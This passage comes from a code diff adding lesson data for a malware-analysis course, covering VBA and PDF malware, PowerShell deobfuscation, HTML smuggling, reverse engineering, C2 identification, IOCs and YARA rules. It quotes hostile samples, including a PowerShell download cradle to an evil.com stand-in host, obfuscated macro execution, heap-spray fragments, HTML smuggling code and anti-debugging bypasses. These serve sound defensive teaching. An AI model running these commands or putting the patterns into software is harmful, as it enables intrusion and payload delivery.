+cmd = Chr(80) & Chr(111) & Chr(119) & Chr(101) & Chr(114) ' = "Power"
+
+' Environment variable abuse
+path = Environ("COMSPEC")  ' = C:\\Windows\\system32\\cmd.exe
+
+' CallByName for indirect execution
+CallByName CreateObject("WScript.Shell"), "Run", VbMethod, cmd
+\`\`\`
+
+## ViperMonkey Emulation
+
+\`\`\`bash
+# Emulate VBA execution without opening the document
+vmonkey malicious.docm
+
+# Outputs:
+# Executed shell commands
+# Downloaded URLs
+# Dropped file paths
+# Registry modifications
+\`\`\`
+
+## Analysis Workflow
+
+\`\`\`
+1. oleid → Confirm macros present
+2. olevba → Extract and identify suspicious patterns
+3. Manual review → Understand logic and deobfuscate
+4. ViperMonkey → Emulate execution safely
+5. Document IOCs → URLs, dropped files, commands
+\`\`\``,
+    keyTakeaways: [
+      "AutoOpen/Document_Open macros execute immediately on file open",
+      "olevba identifies suspicious keywords and deobfuscates strings",
+      "String concatenation and Chr() encoding are primary VBA obfuscation methods",
+      "ViperMonkey safely emulates macro execution without running Office"
+    ]
+  },
+  {
+    id: "4.2",
+    courseId: "malware-analysis",
+    title: "PDF Malware Analysis",
+    content: `# PDF Malware Analysis
+
+Malicious PDFs exploit JavaScript engines, launch actions, and embedded objects to deliver payloads.
+
+## PDF Structure
+
+\`\`\`
+PDF Object Types:
+├── /JS, /JavaScript   → Embedded JavaScript code
+├── /Launch            → Launch external applications
+├── /SubmitForm        → Send data to remote URL
+├── /URI               → Open URL
+├── /EmbeddedFile      → Embedded file attachments
+├── /OpenAction        → Auto-execute on open
+├── /AA                → Additional Actions (triggers)
+├── /ObjStm            → Object Streams (hide objects)
+└── /AcroForm          → Form with potential scripts
+\`\`\`
+
+## Analysis with pdf-parser
+
+\`\`\`bash
+# List all objects
+pdf-parser.py malicious.pdf
+
+# Search for JavaScript
+pdf-parser.py --search javascript malicious.pdf
+pdf-parser.py --search /JS malicious.pdf
+
+# Search for auto-execution
+pdf-parser.py --search /OpenAction malicious.pdf
+pdf-parser.py --search /AA malicious.pdf
+pdf-parser.py --search /Launch malicious.pdf
+
+# Dump specific object content
+pdf-parser.py --object 10 --filter --raw malicious.pdf
+\`\`\`
+
+## peepdf Interactive Analysis
+
+\`\`\`bash
+peepdf -i malicious.pdf
+
+# Interactive commands:
+PPDF> tree          # Show object tree
+PPDF> offsets       # Show object positions
+PPDF> js_analyse    # Extract and analyze JavaScript
+PPDF> object 10     # View specific object
+PPDF> stream 10     # Decode stream content
+PPDF> extract uri   # Extract all URLs
+PPDF> vulns         # Check for known exploit triggers
+\`\`\`
+
+## Common PDF Exploits
+
+| CVE | Target | Technique |
+|-----|--------|-----------|
+| CVE-2017-11882 | Equation Editor | Memory corruption |
+| CVE-2018-4990 | Adobe Reader | Double-free in JPEG2000 |
+| CVE-2023-21608 | Adobe Reader | Use-after-free |
+| N/A | JavaScript Engine | Heap spray + shellcode |
+
+## JavaScript Deobfuscation
+
+\`\`\`javascript
+// Common patterns in malicious PDF JavaScript:
+// 1. eval() with encoded strings
+eval(unescape("%75%6E%65%73%63%61%70%65"));
+
+// 2. Heap spray preparation
+var block = unescape("%u9090%u9090");
+while (block.length < 0x100000) block += block;
+
+// 3. Shellcode in string form
+var sc = unescape("%ue8fc%u0082....");
+\`\`\``,
+    keyTakeaways: [
+      "/OpenAction and /AA objects trigger automatic code execution",
+      "pdf-parser and peepdf are the primary PDF analysis tools",
+      "JavaScript in PDFs often performs heap spraying for exploit delivery",
+      "Always check for /Launch, /JS, /EmbeddedFile, and /URI objects"
+    ]
+  },
+  {
+    id: "4.3",
+    courseId: "malware-analysis",
+    title: "PowerShell & Script Deobfuscation",
+    content: `# PowerShell & Script Deobfuscation
+
+Script-based malware dominates initial access. Deobfuscating these scripts reveals the true payload.
+
+## PowerShell Obfuscation Layers
+
+### Layer 1: Base64 Encoding
+\`\`\`powershell
+# Common launcher pattern
+powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
+
+# Decode:
+echo "SQBFAFgA..." | base64 -d
+# Or in PowerShell:
+[System.Text.Encoding]::Unicode.GetString(
+  [System.Convert]::FromBase64String("SQBFAFgA...")
+)
+\`\`\`
+
+### Layer 2: String Manipulation
+\`\`\`powershell
+# Concatenation
+$a = "Inv" + "oke" + "-Web" + "Req" + "uest"
+
+# Replace
+"Inkove-WebReqkuest".Replace("k","")
+
+# Format strings
+("{2}{0}{1}" -f 'ke-Web','Request','Invo')
+
+# Tick marks (ignored by parser)
+I\`nv\`oke-Web\`Request
+\`\`\`
+
+### Layer 3: Variable Substitution
+\`\`\`powershell
+$v1 = [char]73     # I
+$v2 = [char]69     # E
+$v3 = [char]88     # X
+# Builds "IEX" without the string appearing
+& ($v1+$v2+$v3)
+\`\`\`
+
+## Deobfuscation Techniques
+
+### Manual: Replace IEX with Write-Output
+\`\`\`powershell
+# Original (executes code):
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')
+
+# Safe (prints code):
+Write-Output (New-Object Net.WebClient).DownloadString('http://evil.com/payload')
+
+# Or use a sandbox PowerShell environment
+\`\`\`
+
+### PSDecode
+\`\`\`powershell
+# Automated multi-layer deobfuscation
+Import-Module PSDecode
+PSDecode -dump -verbose encoded_script.ps1
+\`\`\`
+
+## VBScript / JScript Analysis
+
+\`\`\`bash
+# Common delivery: .vbs, .js, .wsf, .hta files
+
+# Extract from HTA
+# Look for <script language="VBScript"> or <script language="JScript">
+
+# Deobfuscate JScript with js-beautify
+js-beautify obfuscated.js > readable.js
+
+# Emulate with box-js (safe JavaScript sandbox)
+box-js malicious.js --output-dir=analysis/
+# Extracts URLs, dropped files, WScript.Shell commands
+\`\`\``,
+    keyTakeaways: [
+      "Replace IEX/Invoke-Expression with Write-Output for safe deobfuscation",
+      "Base64 + string manipulation + variable substitution = common triple layer",
+      "PSDecode automates multi-layer PowerShell deobfuscation",
+      "box-js safely emulates malicious JScript to extract IOCs"
+    ]
+  },
+  {
+    id: "4.4",
+    courseId: "malware-analysis",
+    title: "HTML Smuggling & LNK Files",
+    content: `# HTML Smuggling & LNK Files
+
+Modern phishing bypasses email gateways using HTML smuggling and weaponized shortcut files.
+
+## HTML Smuggling
+
+JavaScript in HTML files constructs and downloads malicious payloads client-side:
+
+\`\`\`javascript
+// Typical HTML smuggling pattern:
+// 1. Base64-encoded payload in JavaScript variable
+var payload = "TVqQAAMAAAAEAAAA//8AALgAAAA...";
+
+// 2. Decode to binary
+var binary = atob(payload);
+var bytes = new Uint8Array(binary.length);
+for (var i = 0; i < binary.length; i++) {
+    bytes[i] = binary.charCodeAt(i);
+}
+
+// 3. Create and trigger download
+var blob = new Blob([bytes], {type: 'application/octet-stream'});
+var url = URL.createObjectURL(blob);
+var a = document.createElement('a');
+a.href = url;
+a.download = 'document.iso';
+a.click();
+\`\`\`
+
+### Analysis Approach
+\`\`\`
+1. Open HTML in text editor (NEVER in browser)
+2. Search for atob(), Uint8Array, Blob, createObjectURL
+3. Extract Base64-encoded payload
+4. Decode with CyberChef: From Base64 → Save output
+5. Analyze the decoded binary/container
+\`\`\`
+
+## Malicious LNK Files
+
+Windows shortcuts can execute arbitrary commands:
+
+\`\`\`bash
+# Parse LNK with LECmd (Eric Zimmerman)
+LECmd.exe -f malicious.lnk --json
+
+# Or use Python lnkparse
+python3 -m lnkparse malicious.lnk
+
+# Key fields:
+# Target: C:\\Windows\\System32\\cmd.exe
+# Arguments: /c powershell -enc SQBFAF...
+# IconLocation: %SystemRoot%\\system32\\shell32.dll (looks like folder)
+# WorkingDir: C:\\Windows\\System32
+\`\`\`
+
+### Common LNK Tricks
+\`\`\`
+Disguise as folder:
+  Icon = folder icon from shell32.dll
+  Name = "Important Documents"
+
+Payload execution:
+  Target: cmd.exe, powershell.exe, mshta.exe, cscript.exe
+  Arguments: contain encoded/obfuscated commands
+
+Living off the land:
+  Target: forfiles.exe /p C:\\Windows /m notepad.exe /c "cmd /c malware.exe"
+  Target: pcalua.exe -a malware.exe
+\`\`\`
+
+## ISO/IMG Container Analysis
+
+Often delivered via HTML smuggling:
+\`\`\`bash
+# Mount and inspect
+7z l suspicious.iso       # List contents without mounting
+7z x suspicious.iso -o./extracted/
+
+# Contents typically:
+# ├── legitimate.pdf      (decoy document)
+# ├── malware.dll         (hidden file)
+# └── shortcut.lnk        (executes DLL via rundll32)
+\`\`\``,
+    keyTakeaways: [
+      "HTML smuggling constructs payloads in-browser to bypass email gateways",
+      "Look for atob(), Blob, and createObjectURL in suspicious HTML files",
+      "LNK files disguise command execution as innocent-looking shortcuts",
+      "ISO containers from HTML smuggling typically contain LNK + DLL pairs"
+    ]
+  },
+  // Module 5: Reverse Engineering Fundamentals
+  {
+    id: "5.1",
+    courseId: "malware-analysis",
+    title: "x86 Assembly Essentials",
+    content: `# x86 Assembly Essentials
+
+Understanding assembly language is essential for reverse engineering malware when source code isn't available.
+
+## Registers
+
+\`\`\`
+General Purpose (32-bit / 64-bit):
+EAX / RAX  → Accumulator, return values
+EBX / RBX  → Base register (callee-saved)
+ECX / RCX  → Counter, 1st arg (x64 Windows)
+EDX / RDX  → Data, 2nd arg (x64 Windows)
+ESI / RSI  → Source index
+EDI / RDI  → Destination index
+ESP / RSP  → Stack pointer (top of stack)
+EBP / RBP  → Base pointer (stack frame)
+EIP / RIP  → Instruction pointer (next instruction)
+
+x64 Additional: R8-R15 (3rd-6th args: R8, R9 on Windows)
+\`\`\`
+
+## Essential Instructions
+
+\`\`\`nasm
+; Data Movement
+MOV EAX, 5          ; EAX = 5
+LEA EAX, [EBX+4]   ; EAX = address of EBX+4
+PUSH EAX            ; Push onto stack
+POP EBX             ; Pop from stack into EBX
+XCHG EAX, EBX      ; Swap values
+
+; Arithmetic
+ADD EAX, EBX        ; EAX += EBX
+SUB EAX, 1          ; EAX -= 1
+INC EAX             ; EAX++
+XOR EAX, EAX        ; EAX = 0 (common zeroing pattern)
+SHL EAX, 3          ; Left shift (multiply by 8)
+
+; Comparison & Branching
+CMP EAX, 5          ; Compare EAX with 5
+TEST EAX, EAX       ; Check if EAX is zero
+JE label            ; Jump if Equal (ZF=1)
+JNE label           ; Jump if Not Equal
+JA / JB             ; Jump Above / Below (unsigned)
+JG / JL             ; Jump Greater / Less (signed)
+JMP label           ; Unconditional jump
+
+; Function Calls
+CALL function       ; Push return address, jump to function
+RET                 ; Pop return address, jump back
+\`\`\`
+
+## Stack Frame Layout
+
+\`\`\`
+High Address
+┌──────────────┐
+│  Arguments   │  Parameters passed to function
+├──────────────┤
+│ Return Addr  │  Pushed by CALL instruction
+├──────────────┤
+│  Saved EBP   │  Previous frame pointer
+├──────────────┤  ← EBP points here
+│ Local Var 1  │  [EBP-4]
+│ Local Var 2  │  [EBP-8]
+│    ...       │
+├──────────────┤  ← ESP points here
+Low Address
+
+Function Prologue:        Function Epilogue:
+  PUSH EBP                  MOV ESP, EBP
+  MOV EBP, ESP              POP EBP
+  SUB ESP, 0x20             RET
+\`\`\`
+
+## Calling Conventions
+
+\`\`\`
+x86 (32-bit cdecl):
+  Arguments pushed right-to-left on stack
+  Caller cleans stack
+
+x64 Windows (fastcall):
+  Args: RCX, RDX, R8, R9, then stack
+  Caller allocates 32-byte shadow space
+
+x64 Linux (System V):
+  Args: RDI, RSI, RDX, RCX, R8, R9, then stack
+\`\`\``,
+    keyTakeaways: [
+      "XOR EAX, EAX is the standard pattern for zeroing a register",
+      "ESP/RSP always points to the top of the stack",
+      "CMP sets flags used by conditional jumps (JE, JNE, JG, JL)",
+      "x64 Windows passes first 4 args in RCX, RDX, R8, R9"
+    ]
+  },
+  {
+    id: "5.2",
+    courseId: "malware-analysis",
+    title: "Ghidra for Malware Analysis",
+    content: `# Ghidra for Malware Analysis
+
+Ghidra is NSA's open-source reverse engineering tool with a powerful decompiler that converts assembly back to C-like code.
+
+## Initial Setup
+
+\`\`\`
+1. Create new project → Import binary
+2. Auto-analysis runs on import:
+   - Disassembly
+   - Function identification
+   - Data type propagation
+   - Cross-reference building
+3. Open CodeBrowser for analysis
+\`\`\`
+
+## Key Windows
+
+\`\`\`
+┌──────────────┬────────────────┬──────────────┐
+│   Symbol     │   Listing      │  Decompiler  │
+│   Tree       │   (Assembly)   │   (C code)   │
+│              │                │              │
+│  Functions   │  MOV EAX,[EBP] │  int main() {│
+│  Imports     │  CALL func_1   │    x = 5;    │
+│  Exports     │  CMP EAX, 0    │    if(x==0)  │
+│  Classes     │  JE label_1    │      ...     │
+└──────────────┴────────────────┴──────────────┘
+\`\`\`
+
+## Essential Techniques
+
+### Rename Everything
+\`\`\`
+Right-click → Rename (L key):
+  FUN_00401000  →  decrypt_c2_config
+  DAT_00403000  →  encrypted_url
+  param_1       →  buffer_ptr
+  local_10      →  decrypted_string
+\`\`\`
+
+### Cross-References (XREFs)
+\`\`\`
+Right-click function → References → Show References To
+→ See everywhere this function is called
+
+Right-click string → References → Show References To
+→ Find which function uses this string
+\`\`\`
+
+### Search Functions
+\`\`\`
+Search → For Strings → Filter interesting strings
+Search → Program Text → Find specific patterns
+Search → For Instruction Patterns → Match opcodes
+\`\`\`
+
+## Ghidra Scripting
+
+\`\`\`python
+# Python script to find XOR decryption loops
+from ghidra.program.model.listing import CodeUnit
+
+listing = currentProgram.getListing()
+for func in currentProgram.getFunctionManager().getFunctions(True):
+    instructions = listing.getInstructions(func.getBody(), True)
+    for instr in instructions:
+        if instr.getMnemonicString() == "XOR":
+            print(f"XOR found in {func.getName()} at {instr.getAddress()}")
+\`\`\`
+
+## Common Malware Patterns in Decompiler
+
+\`\`\`c
+// Dynamic API resolution (avoid import table)
+hModule = LoadLibraryA("kernel32.dll");
+pFunc = GetProcAddress(hModule, "VirtualAlloc");
+pFunc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+// String decryption loop
+for (i = 0; i < len; i++) {
+    decrypted[i] = encrypted[i] ^ key[i % key_len];
+}
+
+// Anti-debugging
+if (IsDebuggerPresent()) {
+    ExitProcess(0);
+}
+\`\`\``,
+    keyTakeaways: [
+      "Ghidra's decompiler converts assembly to readable C-like pseudocode",
+      "Aggressively rename functions and variables as you understand them",
+      "Cross-references reveal how functions and data are interconnected",
+      "Dynamic API resolution hides imports from static analysis"
+    ]
+  },
+  {
+    id: "5.3",
+    courseId: "malware-analysis",
+    title: "Debugging with x64dbg",
+    content: `# Debugging with x64dbg
+
+x64dbg is the primary Windows debugger for malware analysis, enabling step-by-step execution and memory inspection.
+
+## Interface Layout
+
+\`\`\`
+┌────────────────────────────────────────────┐
+│  CPU (Disassembly)  │  Registers           │
+│  Current instruction│  EAX, EBX, ECX...    │
+│  with highlighting  │  Flags: ZF, CF, SF   │
+├─────────────────────┼──────────────────────┤
+│  Dump (Memory)      │  Stack               │
+│  Hex + ASCII view   │  Current stack frame  │
+│  of selected region │  Arguments & locals   │
+└─────────────────────┴──────────────────────┘
+\`\`\`
+
+## Essential Shortcuts
+
+\`\`\`
+F2    → Toggle breakpoint
+F7    → Step Into (follow CALL)
+F8    → Step Over (skip CALL)
+F9    → Run (continue execution)
+Ctrl+G → Go to address/expression
+Space → Assemble (patch instruction)
+\`\`\`
+
+## Breakpoint Strategies
+
+\`\`\`
+Software Breakpoints (F2):
+  Set on specific addresses or API calls
+  bp CreateFileW
+  bp VirtualAllocEx
+
+Hardware Breakpoints (Debug → Hardware):
+  Limited to 4, but undetectable by anti-debug
+  Useful for: memory access, write, execute
+
+Conditional Breakpoints:
+  Break only when condition met
+  bp CreateFileW, condition: [esp+8]=="malware.exe"
+
+Memory Breakpoints:
+  Break on memory region access
+  Right-click dump → Breakpoint → Memory Access
+\`\`\`
+
+## Anti-Debugging Bypass
+
+### Common Techniques
+\`\`\`
+IsDebuggerPresent:
+  → Patch to always return 0 (xor eax, eax; ret)
+  → Or use ScyllaHide plugin (automatic)
+
+NtQueryInformationProcess:
+  → ScyllaHide patches NTDLL hooks
+
+Timing Checks (GetTickCount, rdtsc):
+  → ScyllaHide provides timing normalization
+
+INT 2D / INT 3:
+  → Skip with Step Over, don't Step Into
+
+Self-modifying code:
+  → Use hardware breakpoints (survive code changes)
+\`\`\`
+
+### ScyllaHide Plugin
+\`\`\`
+Plugins → ScyllaHide → Options:
+☑ PEB.BeingDebugged
+☑ PEB.NtGlobalFlag
+☑ NtQueryInformationProcess
+☑ GetTickCount
+☑ BlockInput
+→ Defeats most anti-debug automatically
+\`\`\`
+
+## Dumping Unpacked Code
+
+\`\`\`
+After malware unpacks itself in memory:
+1. Find OEP (Original Entry Point)
+2. Plugins → Scylla → IAT Autosearch
+3. Get Imports → Fix dump
+4. Dump → Save unpacked binary
+5. Analyze clean unpacked sample in Ghidra
+\`\`\``,
+    keyTakeaways: [
+      "F7 steps into calls, F8 steps over — critical for navigating code",
+      "Hardware breakpoints survive anti-debugging and self-modifying code",
+      "ScyllaHide plugin automatically defeats most anti-debugging tricks",
+      "Scylla dumps unpacked malware from memory with import table reconstruction"
+    ]
+  },
+  {
+    id: "5.4",
+    courseId: "malware-analysis",
+    title: "Identifying C2 Protocols",
+    content: `# Identifying C2 Protocols
+
+Reverse engineering Command & Control communication reveals how attackers maintain access and issue commands.
+
+## C2 Communication Models
+
+\`\`\`
+Pull Model (Most Common):
+  Implant ──HTTP GET──→ C2 Server
+  Implant ←──Commands───
+  Implant ──HTTP POST──→ Results
+
+Push Model:
+  C2 Server ──connect──→ Implant (reverse shell)
+
+Peer-to-Peer:
+  Implant ←──→ Implant ←──→ Implant
+        No central server
+
+Hybrid:
+  Initial C2 → Download → Secondary C2
+  (expendable)             (persistent)
+\`\`\`
+
+## XOR Encryption
+
+The most common malware encryption — simple but effective:
+\`\`\`python
+# XOR decrypt function
+def xor_decrypt(data, key):
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+# Single-byte XOR brute force
+for key in range(256):
+    result = bytes([b ^ key for b in encrypted_data])
+    if b"http" in result or b"User-Agent" in result:
+        print(f"Key: 0x{key:02x}, Decrypted: {result}")
+\`\`\`
+
+## Domain Generation Algorithms (DGA)
+
+\`\`\`python
+# Simple time-based DGA example
+import datetime, hashlib
+
+def generate_domains(date, count=10):
+    domains = []
+    seed = date.strftime("%Y%m%d")
+    for i in range(count):
+        h = hashlib.md5(f"{seed}{i}".encode()).hexdigest()
+        domain = h[:12] + ".com"
+        domains.append(domain)
+    return domains
+
+# Reverse engineering DGA:
+# 1. Identify seed (date, counter, hardcoded value)
+# 2. Find hash/transform function
+# 3. Reconstruct algorithm
+# 4. Pre-register domains (sinkholing)
+\`\`\`
+
+## Protocol Identification in Ghidra
+
+\`\`\`c
+// Look for these patterns in decompiled code:
+
+// HTTP C2
+InternetOpenA("Mozilla/5.0...", ...);
+InternetConnectA(hInternet, "c2.evil.com", 443, ...);
+HttpOpenRequestA(hConnect, "POST", "/api/beacon", ...);
+
+// Raw socket C2
+WSAStartup(0x202, &wsaData);
+connect(sock, (sockaddr*)&addr, sizeof(addr));
+send(sock, encrypted_buffer, len, 0);
+
+// DNS tunneling
+DnsQuery_A(encoded_subdomain, DNS_TYPE_TXT, ...);
+// Data exfiltrated in subdomain labels
+// Commands received in TXT records
+\`\`\`
+
+## Config Extraction
+
+\`\`\`python
+# Many malware families store configs in predictable structures
+# CAPE Sandbox extracts configs automatically for known families
+
+# Manual extraction pattern:
+# 1. Find encrypted config blob in .data or .rsrc section
+# 2. Identify decryption routine (XOR, RC4, AES)
+# 3. Extract key from code
+# 4. Decrypt and parse config structure:
+#    - C2 URLs/IPs
+#    - Campaign ID
+#    - Sleep interval
+#    - Encryption keys for communication
+\`\`\``,
+    keyTakeaways: [
+      "HTTP-based C2 is most common due to blending with normal traffic",
+      "XOR encryption is trivially reversible but still widely used",
+      "DGAs generate pseudo-random domains using seeds like dates",
+      "Config extraction reveals C2 infrastructure, campaign IDs, and crypto keys"
+    ]
+  },
+  // Module 6: Reporting & Threat Intelligence
+  {
+    id: "6.1",
+    courseId: "malware-analysis",
+    title: "IOC Extraction & STIX/TAXII",
+    content: `# IOC Extraction & STIX/TAXII
+
+Indicators of Compromise (IOCs) are the actionable output of malware analysis, enabling detection and response across the organization.
+
+## IOC Categories
+
+\`\`\`
+Atomic Indicators (easily searchable):
+├── File Hashes: MD5, SHA1, SHA256
+├── IP Addresses: C2 servers, download sources
+├── Domains: C2 domains, DGA outputs
+├── URLs: Download URLs, callback paths
+├── Email Addresses: Sender addresses
+└── Mutex Names: Synchronization objects
+
+Behavioral Indicators:
+├── Registry Keys: Persistence locations
+├── File Paths: Dropped file locations
+├── Process Names: Spawned processes
+├── Service Names: Installed services
+├── Scheduled Tasks: Persistence tasks
+└── Network Patterns: Beaconing intervals, JA3 hashes
+\`\`\`
+
+## Extraction Workflow
+
+\`\`\`bash
+# From strings
+grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' strings.txt
+grep -oP 'https?://[^\\s"]+' strings.txt
+grep -oP '[a-f0-9]{32}' strings.txt  # MD5
+grep -oP '[a-f0-9]{64}' strings.txt  # SHA256
+
+# From sandbox reports
+# ANY.RUN → IOC tab → Export
+# Cuckoo → Network → DNS/HTTP sections
+# Joe Sandbox → IOCs section
+
+# From PCAP
+tshark -r capture.pcap -T fields -e dns.qry.name | sort -u
+tshark -r capture.pcap -T fields -e http.host | sort -u
+\`\`\`
+
+## STIX 2.1 Format
+
+\`\`\`json
+{
+  "type": "indicator",
+  "spec_version": "2.1",
+  "id": "indicator--a1b2c3d4-...",
+  "created": "2024-01-15T10:00:00Z",
+  "name": "Emotet C2 IP Address",
+  "pattern": "[ipv4-addr:value = '192.168.1.100']",
+  "pattern_type": "stix",
+  "valid_from": "2024-01-15T00:00:00Z",
+  "labels": ["malicious-activity"],
+  "kill_chain_phases": [{
+    "kill_chain_name": "mitre-attack",
+    "phase_name": "command-and-control"
+  }]
+}
+\`\`\`
+
+## TAXII (Trusted Automated Exchange)
+
+\`\`\`python
+from taxii2client.v20 import Collection
+from stix2 import TAXIICollectionSource, Filter
+
+# Connect to TAXII server
+collection = Collection(
+    "https://cti-taxii.mitre.org/stix/collections/95ecc380-...",
+)
+tc_source = TAXIICollectionSource(collection)
+
+# Query for indicators
+indicators = tc_source.query([
+    Filter("type", "=", "indicator"),
+    Filter("pattern", "contains", "192.168.1.100")
+])
+\`\`\``,
+    keyTakeaways: [
+      "IOCs span atomic indicators (hashes, IPs) and behavioral patterns",
+      "STIX 2.1 is the standard format for machine-readable threat intelligence",
+      "TAXII enables automated IOC sharing between organizations",
+      "Extract IOCs from strings, sandbox reports, and network captures"
+    ]
+  },
+  {
+    id: "6.2",
+    courseId: "malware-analysis",
+    title: "YARA Rule Creation",
+    content: `# YARA Rule Creation
+
+YARA rules match patterns in files, enabling detection of malware families across your environment.
+
+## Rule Structure
+
+\`\`\`yara
+rule Emotet_Loader {
+    meta:
+        author = "Analyst"
+        date = "2024-01-15"
+        description = "Detects Emotet loader DLL"
+        hash = "a1b2c3d4e5f6..."
+        reference = "https://analysis-report-url"
+        
+    strings:
+        // Text strings
+        $url1 = "http://evil.com/update" ascii wide
+        $url2 = "http://bad.org/config" ascii wide
+        
+        // Hex patterns (XOR decryption loop)
+        $xor_loop = { 8A 04 0E 30 04 0F 41 3B ?? 72 F4 }
+        
+        // Regex patterns
+        $mutex = /Global\\\\[A-F0-9]{8}-[A-F0-9]{4}/ nocase
+        
+        // Byte patterns with wildcards
+        $api_hash = { 68 ?? ?? ?? ?? E8 ?? ?? ?? ?? 89 45 FC }
+        
+    condition:
+        uint16(0) == 0x5A4D and        // MZ header
+        filesize < 500KB and            // Size constraint
+        (2 of ($url*)) and              // At least 2 URLs
+        ($xor_loop or $api_hash)        // Either pattern
+}
+\`\`\`
+
+## String Modifiers
+
+\`\`\`yara
+$s1 = "malware" ascii        // ASCII encoding
+$s2 = "malware" wide         // UTF-16LE encoding
+$s3 = "malware" ascii wide   // Match both
+$s4 = "MaLwArE" nocase       // Case insensitive
+$s5 = "mal" fullword         // Not part of larger word
+$s6 = { 4D 5A [0-100] 50 45 } // MZ...PE with 0-100 bytes between
+$s7 = { 31 C0 [2-4] C3 }     // xor eax,eax ... ret
+\`\`\`
+
+## Condition Logic
+
+\`\`\`yara
+condition:
+    // Boolean logic
+    $a and $b
+    $a or ($b and $c)
+    not $a
+    
+    // Counting
+    #a > 5                    // $a appears more than 5 times
+    2 of ($url*)              // At least 2 of url-prefixed strings
+    all of ($sig*)            // All sig-prefixed strings
+    any of them               // Any string matches
+    
+    // File properties
+    uint16(0) == 0x5A4D      // PE file (MZ header)
+    uint32(0) == 0x464C457F  // ELF file
+    filesize < 1MB
+    
+    // PE module
+    import "pe"
+    pe.imphash() == "a1b2c3..."
+    pe.exports("DllRegisterServer")
+    pe.number_of_sections > 5
+\`\`\`
+
+## Testing and Deployment
+
+\`\`\`bash
+# Test against known samples
+yara -r rule.yar /path/to/malware/samples/
+
+# Test for false positives against clean files
+yara -r rule.yar /path/to/clean/files/
+
+# Performance testing
+time yara -r rule.yar /large/file/collection/
+
+# Integration with tools
+# VT Hunting, YARA-L (Chronicle), ClamAV, osquery
+\`\`\``,
+    keyTakeaways: [
+      "YARA rules combine string patterns, hex sequences, and conditions",
+      "Always include MZ header check and filesize constraints to reduce false positives",
+      "Test rules against both malware samples AND clean files",
+      "PE module enables matching on imports, exports, and section properties"
+    ]
+  },
+  {
+    id: "6.3",
+    courseId: "malware-analysis",
+    title: "Writing Malware Analysis Reports",
+    content: `# Writing Malware Analysis Reports
+
+A well-structured report transforms technical findings into actionable intelligence for stakeholders.
+
+## Report Structure
+
+\`\`\`
+1. Executive Summary (1 paragraph)
+   - What is it? What does it do? What's the risk?
+   - Written for non-technical leadership
+
+2. Sample Information
+   - Filename, hashes (MD5, SHA1, SHA256)
+   - File type, size, compilation timestamp
+   - First seen date, source
+
+3. Static Analysis Findings
+   - Packing/obfuscation status
+   - Notable strings and imports
+   - PE anomalies
+
+4. Dynamic Analysis Findings
+   - Process activity and child processes
+   - File system modifications
+   - Registry changes
+   - Network communications
+
+5. Code Analysis (if applicable)
+   - Key functions reverse engineered
+   - Encryption/encoding methods
+   - C2 protocol details
+
+6. MITRE ATT&CK Mapping
+   - Tactics and techniques observed
+   - Procedure-level detail
+
+7. Indicators of Compromise
+   - Network IOCs (IPs, domains, URLs)
+   - Host IOCs (files, registry, mutexes)
+   - YARA rules
+
+8. Recommendations
+   - Detection signatures
+   - Blocking rules
+   - Hunting queries
+\`\`\`
+
+## Executive Summary Example
+
+\`\`\`
+The analyzed sample is a 64-bit Windows DLL functioning as a
+second-stage loader for the Emotet banking trojan. Upon execution
+via rundll32.exe, it establishes encrypted HTTPS communication
+with three C2 servers, achieves persistence through a scheduled
+task, and downloads additional modules for credential harvesting.
+Immediate blocking of identified C2 infrastructure and deployment
+of provided YARA rules is recommended.
+\`\`\`
+
+## MITRE ATT&CK Mapping Example
+
+\`\`\`
+| Tactic | Technique | Procedure |
+|--------|-----------|-----------|
+| Execution | T1059.001 | PowerShell download cradle |
+| Persistence | T1053.005 | Scheduled task "WinUpdate" |
+| Defense Evasion | T1027 | XOR-encrypted strings |
+| C2 | T1071.001 | HTTPS POST to /api/update |
+| Exfiltration | T1041 | Data sent over C2 channel |
+\`\`\`
+
+## IOC Table Format
+
+\`\`\`
+| Type | Value | Context |
+|------|-------|---------|
+| SHA256 | a3b2c1d4... | Main DLL payload |
+| IP | 192.168.1.100 | Primary C2 server |
+| Domain | update.evil.com | Secondary C2 |
+| URL | /api/v2/beacon | C2 callback path |
+| Mutex | Global\\MTX_8A2B | Instance check |
+| Registry | HKCU\\...\\Run\\Update | Persistence key |
+| File | %TEMP%\\svchost.dat | Dropped payload |
+\`\`\``,
+    keyTakeaways: [
+      "Executive summaries must be non-technical and action-oriented",
+      "MITRE ATT&CK mapping connects findings to a shared framework",
+      "IOC tables should include context for each indicator",
+      "Reports serve multiple audiences: executives, SOC, and threat intel teams"
+    ]
+  },
+  {
+    id: "6.4",
+    courseId: "malware-analysis",
+    title: "Attribution & Campaign Tracking",
+    content: `# Attribution & Campaign Tracking
+
+Linking malware samples to threat actors and campaigns enables predictive defense and strategic intelligence.
+
+## Attribution Indicators
+
+\`\`\`
+Technical Indicators:
+├── Code Reuse: Shared libraries, functions, algorithms
+├── Infrastructure: Overlapping IPs, domains, registrars
+├── Build Artifacts: PDB paths, Rich headers, timestamps
+├── Tooling: Same builder/packer across campaigns
+├── Crypto: Shared keys, algorithms, implementations
+└── C2 Protocol: Identical communication patterns
+
+Operational Indicators:
+├── Working Hours: Active timezone patterns
+├── Language: Code comments, string artifacts, keyboard layout
+├── Targeting: Consistent victim sectors/regions
+├── TTPs: Consistent attack methodology
+└── Mistakes: Operational security failures
+\`\`\`
+
+## Code Similarity Analysis
+
+\`\`\`python
+# BinDiff: Compare two binaries for shared functions
+# 1. Export IDB from Ghidra/IDA for both samples
+# 2. BinDiff compares function-level similarity
+# Result: 85% function match → likely same author
+
+# ssdeep for fuzzy matching across sample sets
+import ssdeep
+hash1 = ssdeep.hash_from_file("sample_a.exe")
+hash2 = ssdeep.hash_from_file("sample_b.exe")
+similarity = ssdeep.compare(hash1, hash2)
+print(f"Similarity: {similarity}%")
+
+# TLSH (Trend Micro Locality Sensitive Hash)
+import tlsh
+h1 = tlsh.hash(open("sample_a.exe", "rb").read())
+h2 = tlsh.hash(open("sample_b.exe", "rb").read())
+score = tlsh.diff(h1, h2)  # Lower = more similar
+\`\`\`
+
+## Infrastructure Tracking
+
+\`\`\`
+Passive DNS:
+  domain.evil.com → 192.168.1.100 (2024-01-01 to 2024-02-15)
+  domain.evil.com → 10.0.0.50 (2024-02-16 to present)
